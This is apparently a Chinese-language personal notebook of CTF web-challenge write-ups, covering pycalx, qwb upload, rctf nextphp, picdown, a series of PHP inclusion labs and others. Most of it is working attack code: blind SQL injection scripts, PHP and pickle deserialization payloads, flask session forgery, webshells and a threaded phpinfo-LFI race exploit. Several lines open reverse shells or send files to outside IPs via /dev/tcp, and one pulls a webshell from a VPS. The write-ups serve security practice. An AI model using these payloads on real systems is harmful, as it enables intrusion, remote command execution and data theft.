2.`calc_eval = str(repr(value1)) + str(op) + str(repr(value2))，repr()` 函数将对象转化为供解释器读取的形式，当传入不是数字是字符串的时候，会引入引号'，因为get_op仅仅过滤验证了第一位字符，因此我们可以在第二位引入单引号。 value1=a，value2=a，op=+'

3.利用source变量，判断是否等于Flag变量，因为对value1和value2做了异或，所以value1为任意字符串

构造payload：?value1=t&op=%2B%27&value2=and+source+in+FLAG%23&source=flag{

```
import string
import requests
import sys
from urllib import quote

if __name__ == '__main__':
    reg_str = string.punctuation + string.ascii_lowercase + string.ascii_uppercase + string.digits
    Flag = "flag{"
    url = "http://172.16.4.116:4320/cgi-bin/pycalx.py?value1=t&op=%2B%27&value2=+and+source+in+FLAG%23&source=" + quote(Flag)
    for i in range(10):
        for x in reg_str:
            url_t = url + quote(x)
            html = requests.get(url_t).text
            if 'True' in html:
                url = url_t
                Flag = Flag + x
                print(Flag)
                break
```

## meepwn_2018_pycalx2

1.与上一题的唯一差别就是` op = get_op(get_value(arguments['op'].value))`，op也进行了黑名单校验，所以#不能用了

2.F-strings提供了一种明确且方便的方式将python表达式嵌入到字符串中来进行格式化。`value1 = True，value2 ={source*0 if source in FLAG else 233} ，op = +f`执行代码为`'True'+f'{source*0 if source in FLAG else 233}'`

```
import string
import requests
import sys
from urllib import quote

if __name__ == '__main__':
    reg_str = string.punctuation + string.ascii_lowercase + string.ascii_uppercase + string.digits
    Flag = "flag{"
    url = "http://172.16.4.116:4320/cgi-bin/pycalx2.py?value1=True&op=%2Bf&value2=%7Bsource*0+if+source+in+FLAG+else+233%7D&source=" + quote(Flag)
    for i in range(10):
        for x in reg_str:
            url_t = url + quote(x)
            print(url_t)
            html = requests.get(url_t).text
            if 'True' in html:
                url = url_t
                Flag = Flag + x
                print(Flag)
                break
```

## qwb_2019_smarthacker

有1000多个php文件，每个文件里都有shell,写个脚本去探测shell的可用性，只会写单线程的，这里只正则寻找了get参数，其实还应该有post,大概跑了五分钟

```
import re
import os
import requests

files = os.listdir('/Users/yechengcheng/Desktop/ctf_training/qwb_2019_smarthacker/files/src/')    #获取路径下的所有文件
reg = re.compile(r'(?<=_GET\[\').*(?=\'\])')   #设置正则
for i in files:                #从第一个文件开始
    url = "http://172.16.4.116:8302/" + i
    f = open("/Users/yechengcheng/Desktop/ctf_training/qwb_2019_smarthacker/files/src/"+i)        #打开这个文件
    data = f.read()           #读取文件内容
    f.close()                 #关闭文件
    result = reg.findall(data)  #从文件中找到GET请求
    for j in result:           #从第一个GET参数开始
        payload = url + "?" + j + "=echo 123456"   ##尝试请求次路径，并执行命令
        print(payload)
        html = requests.get(payload)
        if "123456" in html.text:
            print(payload)
            exit(1)
```
![image](http://note.youdao.com/yws/res/1667/02F816CD0C0E475DAB8C4652A9342AE8)



## qwb_2019_upload

1.源码泄露，本地复现不了，注册登录后可上传图片马，本地复现不了

2.源码有这样几段，在html/application/controller路径下

![image](http://note.youdao.com/yws/res/1677/C107150771D44F9AA8103E376451C301)

存在反序列化和魔法函数

![image](http://note.youdao.com/yws/res/1680/5C8A7AA08D544BF7A0D3861C70F5B59C)

![image](http://note.youdao.com/yws/res/1682/ACCC4FAA96364636B25613DC9B611FC5)

index.php是一个索引界面，我们请求过去后，反序例化我们传过去的对象来检查是否登陆

在Register.php的析构函数中，主要想判断是否注册成功，没成功调用index方法

Profile.php中的_call和_get方法分别是在调用不可调用方法和不可调用成员变量时怎么做

这时候我们通过call去调用upload_img方法，通过控制传参来调用copy将png图片拷贝为php文件

所以我们这里利用析构函数来构造，将cheeker构造为profile对象，调用起index的时候，调用了不存在的方法所以触发

```
<?php
namespace app\web\controller; //要不然反序列化会出错，不知道对象实例化的是哪个类

class Profile
{
    public $checker;
    public $filename_tmp;
    public $filename;
    public $upload_menu;
    public $ext;
    public $img;
    public $except;


    public function __get($name)
    {
        return $this->except[$name];
    }

    public function __call($name, $arguments)
    {
        if($this->{$name}){
            $this->{$this->{$name}}($arguments);
        }
    }

}

class Register
{
    public $checker;
    public $registed;

    public function __destruct()
    {
        if(!$this->registed){
            $this->checker->index();
        }
    }

}

$profile = new Profile();
$profile->except = ['index' => 'img'];//代表要是访问 index 这个变量，就会返回 img
$profile->img = "upload_img";//img 赋值 upload_img，让这个对象被访问不存在的方法时最终调用 upload_img
$profile->ext = "png";
$profile->filename_tmp = "../public/upload/da5703ef349c8b4ca65880a05514ff89/e6e9c48368752b260914a910be904257.png";
$profile->filename = "../public/upload/da5703ef349c8b4ca65880a05514ff89/e6e9c48368752b260914a910be904257.php";

//构造一个 Register，checker 赋值为 我们上面这个 $profile，registed 赋值为 false，这样在这个对象析构时就会调用 profile 的 index 方法，再跳到 upload_img 了
$register = new Register();
$register->registed = false;
$register->checker = $profile;

echo urlencode(base64_encode(serialize($register)));

```

重置cookie,刷新会发现刚才上传的图片马变成了php后缀，然后蚁剑连接

## rctf nextphp

https://blog.csdn.net/qq_41809896/article/details/90384668

eval可执行，?a=echo phpinfo();

查看配置，scandir()可利用

?a=var_dump(scandir('/var/www/html'));

?a=echo get_file_contents('preload.php');

![image](http://note.youdao.com/yws/res/1711/9355C4630D2C47788AF0EA4BDBDBDB09)

![image](http://note.youdao.com/yws/res/1713/AE8CEDF7BD454FCA8CC1880D223C7736)

构造序列化对象

```
<?php

class A implements Serializable
{
    protected $data = [
        'ret' => null,
        'func' => 'FFI::cdef',
        'arg' => 'int system(const char *command);'
    ];

    public function serialize(): string
    {
        return serialize($this->data);
    }

    public function unserialize($payload)
    {
        $this->data = unserialize($payload);
    }
}
    $obj = new A;
    $ser = serialize($obj);
    echo $ser."\n";

```

最终payload为http://nextphp.2019.rctf.rois.io/?a=unserialize('C:1:"A":95:{a:3:{s:3:"ret";N;s:4:"func";s:9:"FFI::cdef";s:3:"arg";s:32:"int system(const char *command);";}}}')->__get('ret')->system('bash -c "cat /flag > /dev/tcp/167.99.105.52/8080"');

不明白为什么要先序列化后再反序列化，再将ret指向bash命令，本地开启的端口也没有监听到

## pwnhub_2018

设计[phpjiami](https://github.com/virink/phpext_phpjiami_decode)，但是解密不成功

## SCTF2018 BabySyc - Simple PHP Web
同样涉及到php代码解密问题，phpjiami-decode搭建在Ubuntu里，但是解密不成功

https://xz.aliyun.com/t/2403，这篇博客，博主就是用的这个插件解密的两题

## wdb_unfinish

存在注册页面，并且用户名在登录页面没有用到，在首页会原样显示，用户名存在注入

```
// 0+hex+0是为了防止丢失数据
email=test@666.com&username=0'%2B(select hex(hex(database())))%2B'0&password=test
//10位取一次，因为超过长度会被表示成科学计数法
email=test@59.com&username=0'%2B(select substr(hex(hex((select * from flag))) from 1 for 10))%2B'0&password=test
```

还有一个大佬的脚本，用的盲注

```
import requests
import re

register_url = "http://124.126.19.106:49676/register.php"
login_url = "http://124.126.19.106:49676/login.php"
database = ""
table_name = ""
column_name = ""
flag = ""
#获取数据库名
'''
for i in range(1,10):
    register_data = {
        'email':'test@test'+ str(i),
        'username':"0'+ascii(substr((select database()) from %d for 1))+'0"%i,
        'password':123
        }
    r = requests.post(url=register_url,data=register_data)
    login_data = {
        'email':'test@test'+ str(i),
        'password':123
        }
    r = requests.post(url=login_url,data=login_data)
    match = re.search(r'<span class="user-name">\s*(\d*)\s*</span>',r.text)
    asc = match.group(1)
    if asc == '0':
        break
    database = database + chr(int(asc))
print('database:',database)
'''
#获取表名
'''
for i in range(1,20):
    register_data = {
        'email':'test@test'+ str(i),
        'username':"0'+ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()) from %d for 1))+'0"%i,
        'password':123
        }
    r = requests.post(url=register_url,data=register_data)
    print(r.text)
    login_data = {
        'email':'test@test'+ str(i),
        'password':123
        }
    r = requests.post(url=login_url,data=login_data)
    r.encoding = r.apparent_encoding
    print(r.text)
    match = re.search(r'<span class="user-name">\s*(\d*)\s*</span>',r.text)
    asc = match.group(1)
    if asc == '0':
        break
    table_name = table_name + chr(int(asc))
print('table_name:',table_name)
'''
#获取flag
for i in range(1,100):
    register_data = {
        'email':'test@test'+ str(i) + str(i),
        'username':"0'+ascii(substr((select * from flag) from %d for 1))+'0"%i,
        'password':123
        }
    r = requests.post(url=register_url,data=register_data)
    login_data = {
        'email':'test@test'+ str(i) + str(i),
        'password':123
        }
    r = requests.post(url=login_url,data=login_data)
    match = re.search(r'<span class="user-name">\s*(\d*)\s*</span>',r.text)
    asc = match.group(1)
    if asc == '0':
        break
    flag = flag + chr(int(asc))
print('flag:',flag)
```

## Zhuanxv

1.存在list文件夹，并且存在文件包含，访问/loadimage?fileName=../../WEB-INF/web.xml，下载文件

2.读取../../WEB-INF/classes/applicationContext.xml下的文件，../../WEB-INF/classes/com/cuitctf/service/impl/UserServiceImpl这样下载下来
拖下来所有的源码之后用 jd-gui就可以看源码了，存在注入

![image](http://note.youdao.com/yws/res/1767/FA5D559D5B554A918441F7EB9B2A102E)


payload: user.name=1'or''like''or''like'&user.password=aaaa

相当于 from user where'1'or''like''or''like'' and password='aaa'

基础知识，这里存在这样的逻辑：

select 1=2 or 1=1 or 1=1 and 1=2;

相当于=> select 1=2 or 1=1 or ( 1=1 and 1=2 );

![image](http://note.youdao.com/yws/res/1777/580EBB632AD348DAA619C1B929E19BBA)

```
import requests
url = "http://124.126.19.106:50461/zhuanxvlogin"

def first():
    admin_password = ""
    for i in range(1,9):
        for n in range(30,140):
            guess = chr(n)
            if guess == "_" or guess == "%":
                continue
            username = "aaa'\nor\n(select\nsubstring(password,"+str(i)+",1)\nfrom\nUser\nwhere\nname\nlike\n'homamamama')\nlike\n'"+guess+"'\nor\n''like'"
            data = {"user.name": username, "user.password": "a"}
            req = requests.post(url, data=data, timeout=1000).text
            if len(req)>5000:
                admin_password = admin_password + guess
                print "admin password: "+ admin_password
                break
    return admin_password
def second(admin_password):
    flag = ""
    for i in range(1,50):
        for n in range(30,140):
            guess = chr(n)
            if guess == "_" or guess == "%":
                continue
            username = "aa'\nor\n(select\nsubstring(welcometoourctf,"+str(i)+",1)\nfrom\nFlag)\nlike\n'"+guess+"'\nand\n''like'"
            # 下载flag.class类，?fileName=../../WEB-INF/classes/com/cuitctf/po/Flag.class，反编译后可以发现列名为welcometoourctf
            data = {"user.name": username, "user.password": admin_password}
            req = requests.post(url, data=data, timeout=1000).text
            if len(req)>5000:
                flag = flag + guess
                print "flag:" + flag
                break
admin_password = first() 
# admin_password = '6YHN7UJM'   
second(admin_password)

```

## 

1.下载附件，发现邮箱没有做校验，最后执行的sql就是`select id from user where email = 'your input email'`
![image](http://note.youdao.com/yws/res/1781/1D2960C4C98D4AC3B244455A8FC07929)
![image](http://note.youdao.com/yws/res/1779/7C31387C8D7C434885CF8C7734C4C1B0)

2.所以payload结合注入，拼接后的sql语句为`select id from user where email = 'test'/**/or/**/1=1#@test.com'`

这里用到了group_concat([DISTINCT] 要连接的字段 [Order BY ASC/DESC 排序字段] [Separator '分隔符'])

```
import requests
from bs4 import BeautifulSoup

url = "http://124.126.19.106:53939/register"

r = requests.get(url)
soup = BeautifulSoup(r.text,"html5lib")
token = soup.find_all(id='csrf_token')[0].get("value")

notice = "Please use a different email address."
result = ""

# SEPARATOR/**/0x3c62723e，表示以<br>分割
database = "(SELECT/**/GROUP_CONCAT(schema_name/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/INFORMATION_SCHEMA.SCHEMATA)"
tables = "(SELECT/**/GROUP_CONCAT(table_name/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/INFORMATION_SCHEMA.TABLES/**/WHERE/**/TABLE_SCHEMA=DATABASE())"
columns = "(SELECT/**/GROUP_CONCAT(column_name/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/WHERE/**/TABLE_NAME=0x666c616161616167)"
data = "(SELECT/**/GROUP_CONCAT(flag/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/flag)"


for i in range(1,100):
    for j in range(32,127):
        payload = "ycc'/**/or/**/ascii(substr("+  data +",%d,1))=%d#/**/@qq.com" % (i,j)
        post_data = {
            'csrf_token': token,
            'username': 'a',
            'email':payload,
            'password':'a',
            'password2':'a',
            'submit':'Register'
        }
        r = requests.post(url,data=post_data)
        soup = BeautifulSoup(r.text,"html5lib")
        token = soup.find_all(id='csrf_token')[0].get("value")
        if notice in r.text:
            result += chr(j)
            print(result)
            break
```

## love math(攻防世界)

payload: $pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&pi=system&abs=cat flag.php

分析:36进制，可以带所有小写字母
```
base_convert(37907361743,10,36) => "hex2bin"
dechex(1598506324) => "5f474554"
$pi=hex2bin("5f474554") => $pi="_GET"   //hex2bin将一串16进制数转换为二进制字符串
($$pi){pi}(($$pi){abs}) => ($_GET){pi}($_GET){abs}  //{}可以代替[]
```


## ikum bilibili CISCN 2019

1.用脚本找到v6最贵的

```
import requests

for i in range(1,200):
    url = 'http://124.126.19.106:43425/shop?page=' + str(i)
    res = requests.get(url)
    text = res.text

    if 'lv6.png' in text:
        print(i)
        break
```

2. 购买时抓包，修改discount为0.000000000001，购买成功后提示/b1g_m4mber
3. 访问提示只有admin，抓包请求头有一个jwt，base64后为自己的登录信息，用c-jwt-cracker-master跑出密码为ikun,用[在线工具](https://jwt.io/)修改ycc为admin，然后替换掉头部的jwt
4. 查看源码下载源码，在admin.py里有一段python序列化
![image](http://note.youdao.com/yws/res/1813/A2597ADDA5FF402FB364B10F60F7865A)
5.运用pickle的内置函数访问flag.txt，生成的序列化字符串替换became参数

```
import pickle
import urllib

class payload(object):
    def __reduce__(self):
       return (eval, ("open('/flag.txt','r').read()",))

a = pickle.dumps(payload())
a = urllib.quote(a)
print a
```

## Background_Management_System

照着writeup做完才发现网站根目录是http://124.126.19.106:55757/xinan/public/，所以一开始扫描目录什么也没有

![image](http://note.youdao.com/yws/res/1827/E153F4B18ED047739B7C9FFFB0BFF685)

1.存在www.zip，下载源码，可以发现修改密码存在漏洞，用admin'#和123注册，登录后修改密码，然后用admin和123登录

2.登录后提示hint,访问xinan/public/55ceedfbc97b0a81277a55506c34af36.php，接受参数url

3.源码在shell.php，cat  55ceedfbc97b0a81277a55506c34af36.php能看见限制了gopher协议

![image](http://note.youdao.com/yws/res/1844/BA1C13BD4BD74025A54C8340D57A8A02)

![image](http://note.youdao.com/yws/res/1839/22C56E58C43B435EA38E3B5592341882)

最终payload:

http://124.126.19.106:51252/xinan/public/55ceedfbc97b0a81277a55506c34af36.php?url=gopher://127.0.0.1:80/_GET%20/xinan/public/shell.php%253Fcmd=cat%2B/flag


## email
1.先用邮箱注册一个账号，注册时email有注入，输入123@qq.com'报错，payload为post： username=dwedwqewqddwqwdwqdwe&mail=123@qq.com' or '1'='1&passwd=123，提示User or Mail Already Registered

2.盲注，writeup用的sqlmap我没跑出来，并且writeup有提示是sqlite数据库，所以一开始的sql没爆出来表名

```
import string
import random
import requests

if __name__ == "__main__":

    allchars = string.ascii_letters + string.ascii_uppercase + string.digits + '$'
    passwd = '123'
    #爆破表,sqlite数据库
    mail = '123@qq.com' + "' or substr((select name from sqlite_master where type='table' limit 1,1),{},1)='{}"
    # 爆破列，sqlite3:PRAGMA table_info('users');以换行形式输出
    # 爆破密码，h4ck4fun
    # mail = '123@qq.com' + "' or substr((select passwd from users where username='admin'),{},1)='{}"


    password = ''
    cookies = 'PHPSESSID=obpfiog3p0en2ruhieokft5la4; ScanLoginKey=5eb502407a7a2; username=admin'
    cookies2 = dict(map(lambda x:x.split('='),cookies.split(";")))
    # print(cookies2)
    for i in range(1,50):
        for c in allchars:
            ran_str = ''.join(random.sample(string.ascii_letters + string.digits, 12))
            this_payload = {
                'username': ran_str,
                'passwd': passwd,
                'mail': mail.format(i,c)
            }
            res = requests.post('http://124.126.19.106:32486/user/register/',cookies=cookies2, data=this_payload)
            # print(this_payload)
            # print(res.text)
            if 'User or Mail Already Registered' in res.text:
                password = password + c
                print(password)
                break

        if c == '$':
            print('finish')
            break
```

3.登录后提示if session['isadmin']: return flag,修改邮箱存在格式化字符串漏洞，输入{user}有回显，最终payload为{user.__class__.__init__.__globals__[current_app].config}，查看源码里的secret_key，使用key生成新的cookie，然后替换cookie

[flask的session伪造](https://github.com/noraj/flask-session-cookie-manager)

```
from flask.sessions import SecureCookieSessionInterface
import traceback
import ast

class MockApp(object):
    def __init__(self, secret_key):
        self.secret_key = secret_key

def encode(secret_key, session_cookie_structure):
    try:
        app = MockApp(secret_key)
        session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))
        si = SecureCookieSessionInterface()
        s = si.get_signing_serializer(app)
        return s.dumps(session_cookie_structure)
    except Exception as e:
        traceback.print_exc()
        raise Exception, "error"
        return False

if __name__ == "__main__":
    payload = "{'isadmin': 1, 'user': (1, 'admin', 'admin@qq.com')}"
    key = '6cfe0f4d060c99a465a09d6fc98294d8'
    print(encode(key, payload))
```

## 原型链污染

1.lodash库 [Code-Breaking 2018 Thejs](https://www.freebuf.com/articles/web/200406.html)

2.构造原型属性 [redpwnctf-web-blueprint](https://www.cnblogs.com/tr1ple/p/11360881.html)

3.CVE-2019-10795 undefsafe原型链污染 [notes网鼎杯2020青龙组](http://www.gem-love.com/websecurity/2322.html)


## wdb_白虎——picdown

1. 输入 ` file:///proc/self/cmdline`可以看见`Python\x00/app/app.py`源码，file前加空格绕过源码前端白名单
2. 审计源码，发现有个backdoor函数，校验key是否相同并且有cmd命令执行

```
from flask import Flask
from flask import render_template
from flask import request
import os
import urllib
import random

app = Flask(__name__)

key_path = "/tmp/.secret_key"
f = open(key_path, "r")
secret_key = f.read()
app.logger.info('secret_key: %s', secret_key)
os.remove(key_path)

def random_string(length=0x10, charset=__import__('string').ascii_letters + __import__('string').digits):
    import random
    return ''.join([random.choice(charset) for _ in range(length)])

def download(url, path):
    with open(path, "wb") as f:
        f.write(urllib.urlopen(url).read())

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'GET':
        return render_template('index.html')
    if request.method == 'POST':
        url = request.form['url']
        if url.startswith("file://"):
            return "Hacker!"
        else:
            try:
                filename = "{}.png".format(random_string(0x20))
                path = "./static/{}".format(filename)
                download(url, path)
                return "<script>window.location='/static/{}'</script>".format(filename)
            except Exception as e:
                return repr(e)
                print(repr(e))
                return "Something wrong!"
    return 

@app.route('/707b4fb4-7dcd-4699-b763-c96536c59004')
def backdoor():
    key = request.args.get('key', '').strip()
    cmd = request.args.get('cmd', '')
    if key == secret_key.strip():
        return "{}".format(os.system(cmd))
    else:
        return "Incorrect Key! {}\n {}".format(key, secret_key)

app.run("0.0.0.0", 3000)
```
3.但是/tmp/.secretkey生成后立马被删除，所以访问` file://proc/self/fd/3`访问标准输出，可以得到key
4.反弹shell,vps监听8899端口，执行payload
```
//cmd = bash -c 'bach -i > /dev/tcp/118.24.240.40 0>&1' 外面包一层bash -c可以防止终端不是bash的环境
?key=0c357d8f-93b0-497d-83be-5145fac146bd&cmd=bash%20-c%20'bash%20-i%20%3e%20%2fdev%2ftcp%2f118.24.240.40%2f8899%200%3e%261'
```
这里不能直接cmd=ls，因为Python返回的是执行结果的状态码

## wangyihang inclusion --05

1. 访问upload.php源码

```
<?php

if ($_FILES["file"]["error"] === UPLOAD_ERR_OK) {
    $path = "upload/".trim(file_get_contents('/proc/sys/kernel/random/uuid')).".txt";
    move_uploaded_file(
        $_FILES["file"]["tmp_name"],
        $path
    );
    echo '<a>'.$path.'</a>';
}
?>
```
2.生成phar文件
```
<?php
class X
{
    public function __destruct()
    {
        echo '_dectrcut';
    }
}
@unlink('c.phar');
$phar = new Phar("c.phar"); //后缀名必须为 phar
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置 stub
$o = new X();
$phar->setMetadata($o); //将自定义的 meta-data 存入 manifest
$phar->addFromString("boc.php", '<?php eval($_REQUEST["c"]);'); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
```
3.上传c.phar，生成upload路径，最终payload
```
http://train.overflow.host:20005/?page=phar://upload/79c6bfd0-6bdf-434e-affa-46885eee7efc.txt/boc&c=system("cat /196e94bc-76c9-4225-8dfc-4652ce22645e.flag");
```

## wangyihang inclusion -- 06

```
<?php

session_start();

$file = $_GET['file'];

if (isset($file)) {
    include $file;
} else {
    show_source(__FILE__);
}

$secret = $_GET['secret'];
if (isset($secret)) {
    $_SESSION['secret'] = $secret;
}
/* phpinfo.php */ 
```

payload: http://train.overflow.host:20006/?file=/tmp/sess_6c50d4b52d8680d22328f6eafe2ababd&secret=%3C?php%20system(%22cat%20/flag%22);?%3E

## wangyihang inclusion -- 07

远程文件包含

```
//方案一：vps上开启php服务0.0.0.0:8080，新建一句话webshell
?file=http://118.24.240.40:1122//webshell&1=phpinfo();

方案二
?file=php://inpyt&1=phpinfo();

post: <?php eval($_REQUEST[1]);?>
```
![image](http://note.youdao.com/yws/res/2035/C24746A9A8A54E4C85F1236BA798954C)


## wangyihang inclusion --09

1.会把所有上传的内容转成0o

```
<?php

function random_string($length) {
	return substr(str_shuffle(str_repeat($x='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil($length/strlen($x)) )),1,$length);
}

if($_FILES['file']){
	$target_dir = "upload/";
	$filename = md5(random_string(0x20)).'.php';
	$path = $target_dir.$filename;
	$content = preg_replace(
		'/[^0o]/',
		'',
		file_get_contents($_FILES['file']['tmp_name'])
	);
	file_put_contents(
		$path,
		$content
	);
	die('File: '.$path.' uploaded!');
}
?>
```
2.下面脚本通过多次base64_docode转换出更多可见字符，经过多次decode

```
# coding=utf-8

import string
import itertools
import os

base64_chars = string.letters + string.digits + "+/"


def robust_base64_decode(data):
    robust_data = ""
    base64_charset = string.letters + string.digits + "+/"
    for i in data:
        if i in base64_charset:
            robust_data += i
    robust_data += "=" * (4 - len(robust_data) % 4)
    return robust_data.decode("base64").replace("\n", "")


def robust_base64_encode(data):
    return data.encode("base64").replace("\n", "").replace("=", "")


def enmu_table(allow_chars):
    possible = list(itertools.product(allow_chars, repeat=4))
    table = {}
    for list_data in possible:
        data = "".join(list_data)
        decoded_data = data.decode("base64")
        counter = 0
        t = 0
        for x in decoded_data:
            if x in base64_chars:
                counter += 1
                t = x
        if counter == 1:
            table[t] = data
    return table


def generate_cipher(tables, data):
    encoded = robust_base64_encode(data)
    result = encoded
    for d in tables[::-1]:
        encoded = result
        result = ""
        for i in encoded:
            result += d[i]
    return result


def enmu_tables(allow_chars):
    filename = "".join(allow_chars)
    tables = []
    saved_length = 0
    flag = True
    while True:
        table = enmu_table(allow_chars)
        length = len(table.keys())
        if saved_length == length:
            flag = False
            break
        saved_length = length
        # print "[+] %d => %s" % (length, table)
        print "[+] Got %d chars : %s" % (length, table.keys())
        tables.append(table)
        allow_chars = table.keys()
        if set(table.keys()) >= set(base64_chars):
            break
    if flag:
        return tables
    return False


def main():
    data = "<?php eval($_GET[1]);?>"
    print "[+] Base64 chars : %s" % (base64_chars)
    print "[+] Plain : %s" % (data)
    chars = "0o"
    print "[+] Start charset : [%s]" % (chars)
    filename = chars
    print "[+] Generating tables..."
    tables = enmu_tables(set(chars))
    if tables:
        print "[+] Trying to encode data..."
        cipher = generate_cipher(tables, data)
        with open(filename, "w") as f:
            f.write(cipher)
            print "[+] The encoded data is saved to file (%d Bytes) : %s" % (len(cipher), filename)
        command = "php -r 'include(\"" + "php://filter/convert.base64-decode/resource=" * (
            len(tables) + 1) + "%s\");'" % (filename)
        print "[+] Usage : %s" % (command)
        print "[+] Executing..."
        os.system(command)
    else:
        print "[-] Failed : %s" % (tables)


if __name__ == "__main__":
    main()
```

![image](http://note.youdao.com/yws/res/1994/498959EF5BA4426585B2A1F11DE26BF9)
3.上传生成的0o文件，访问url，最终payload

```
http://train.overflow.host:20009/index.php?action=php://filter/convert.base64-decode/resource=php://filter/convert.base64-decode/resource=php://filter/convert.base64-decode/resource=php://filter/convert.base64-decode/resource=php://filter/convert.base64-decode/resource=php://filter/convert.base64-decode/resource=php://filter/convert.base64-decode/resource=php://filter/convert.base64-decode/resource=upload/db672eb3c9cfe55a8cbfd83f9ddbd12c&1=system(%27cat%20/flag%27);
```

## wangyihang inclusion --02

[一航师傅的博客](https://www.jianshu.com/p/dfd049924258)

## inclusion --03

https://www.cnblogs.com/xiaoqiyue/p/10158702.html

往phpinfo页面post文件，

在给PHP发送POST数据包时，如果数据包里包含文件区块，无论访问的代码中是否有处理文件上传的逻辑，php都会将这个文件保存成一个临时文件（通常是/tmp/php[6个随机字符]），这个临时文件在请求结束后就会被删除，同时，phpinfo页面会将当前请求上下文中所有变量都打印出来。但是文件包含漏洞和phpinfo页面通常是两个页面，理论上我们需要先发送数据包给phpinfo页面，然后从返回页面中匹配出临时文件名，将这个文件名发送给文件包含漏洞页面。

因为在第一个请求结束时，临时文件就会被删除，第二个请求就无法进行包含。

但是这并不代表我们没有办法去利用这点上传恶意文件，只要发送足够多的数据，让页面还未反应过来，就上传我们的恶意文件，然后文件包含：

1）发送包含了webshell的上传数据包给phpinfo，这个数据包的header，get等位置一定要塞满垃圾数据；

2）phpinfo这时会将所有数据都打印出来，其中的垃圾数据会将phpinfo撑得非常大

3）PHP默认缓冲区大小是4096，即PHP每次返回4096个字节给socket连接

4）所以，我们直接操作原生socket，每次读取4096个字节，只要读取到的字符里包含临时文件名，就立即发送第二个数据包

5）此时，第一个数据包的socket连接其实还没有结束，但是PHP还在继续每次输出4096个字节，所以临时文件还未被删除

6）我们可以利用这个时间差，成功包含临时文件，最后getshell

利用这个[exp.py](https://github.com/vulhub/vulhub/blob/master/php/inclusion)

```
#!/usr/bin/python 
import sys
import threading
import socket

def setup(host, port):
    TAG="Security Test"
    PAYLOAD="""%s\r
<?php file_put_contents('/tmp/g', '<?=eval($_REQUEST[1])?>')?>\r""" % TAG
    REQ1_DATA="""-----------------------------7dbff1ded0714\r
Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r
Content-Type: text/plain\r
\r
%s
-----------------------------7dbff1ded0714--\r""" % PAYLOAD
    padding="A" * 5000
    REQ1="""POST /phpinfo.php?a="""+padding+""" HTTP/1.1\r
Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie="""+padding+"""\r
HTTP_ACCEPT: """ + padding + """\r
HTTP_USER_AGENT: """+padding+"""\r
HTTP_ACCEPT_LANGUAGE: """+padding+"""\r
HTTP_PRAGMA: """+padding+"""\r
Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
Content-Length: %s\r
Host: %s\r
\r
%s""" %(len(REQ1_DATA),host,REQ1_DATA)
    #modify this to suit the LFI script   
    LFIREQ="""GET /?file=%s HTTP/1.1\r
User-Agent: Mozilla/4.0\r
Proxy-Connection: Keep-Alive\r
Host: %s\r
\r
\r
"""
    return (REQ1, TAG, LFIREQ)

def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    

    s.connect((host, port))
    s2.connect((host, port))

    s.send(phpinforeq)
    d = ""
    while len(d) < offset:
        d += s.recv(offset)
    try:
        i = d.index("[tmp_name] =&gt; ")
        fn = d[i+17:i+31]
    except ValueError:
        return None

    s2.send(lfireq % (fn, host))
    d = s2.recv(4096)
    s.close()
    s2.close()

    if d.find(tag) != -1:
        return fn

counter=0
class ThreadWorker(threading.Thread):
    def __init__(self, e, l, m, *args):
        threading.Thread.__init__(self)
        self.event = e
        self.lock =  l
        self.maxattempts = m
        self.args = args

    def run(self):
        global counter
        while not self.event.is_set():
            with self.lock:
                if counter >= self.maxattempts:
                    return
                counter+=1

            try:
                x = phpInfoLFI(*self.args)
                if self.event.is_set():
                    break                
                if x:
                    print "\nGot it! Shell created in /tmp/g"
                    self.event.set()
                    
            except socket.error:
                return
    

def getOffset(host, port, phpinforeq):
    """Gets offset of tmp_name in the php output"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    s.send(phpinforeq)
    
    d = ""
    while True:
        i = s.recv(4096)
        d+=i        
        if i == "":
            break
        # detect the final chunk
        if i.endswith("0\r\n\r\n"):
            break
    s.close()
    i = d.find("[tmp_name] =&gt; ")
    if i == -1:
        raise ValueError("No php tmp_name in phpinfo output")
    
    print "found %s at %i" % (d[i:i+10],i)
    # padded up a bit
    return i+256

def main():
    
    print "LFI With PHPInfo()"
    print "-=" * 30

    if len(sys.argv) < 2:
        print "Usage: %s host [port] [threads]" % sys.argv[0]
        sys.exit(1)

    try:
        host = socket.gethostbyname(sys.argv[1])
    except socket.error, e:
        print "Error with hostname %s: %s" % (sys.argv[1], e)
        sys.exit(1)

    port=80
    try:
        port = int(sys.argv[2])
    except IndexError:
        pass
    except ValueError, e:
        print "Error with port %d: %s" % (sys.argv[2], e)
        sys.exit(1)
    
    poolsz=10
    try:
        poolsz = int(sys.argv[3])
    except IndexError:
        pass
    except ValueError, e:
        print "Error with poolsz %d: %s" % (sys.argv[3], e)
        sys.exit(1)

    print "Getting initial offset...",  
    reqphp, tag, reqlfi = setup(host, port)
    offset = getOffset(host, port, reqphp)
    sys.stdout.flush()

    maxattempts = 1000
    e = threading.Event()
    l = threading.Lock()

    print "Spawning worker pool (%d)..." % poolsz
    sys.stdout.flush()

    tp = []
    for i in range(0,poolsz):
        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))

    for t in tp:
        t.start()
    try:
        while not e.wait(1):
            if e.is_set():
                break
            with l:
                sys.stdout.write( "\r% 4d / % 4d" % (counter, maxattempts))
                sys.stdout.flush()
                if counter >= maxattempts:
                    break
        print
        if e.is_set():
            print "Woot!  \m/"
        else:
            print ":("
    except KeyboardInterrupt:
        print "\nTelling threads to shutdown..."
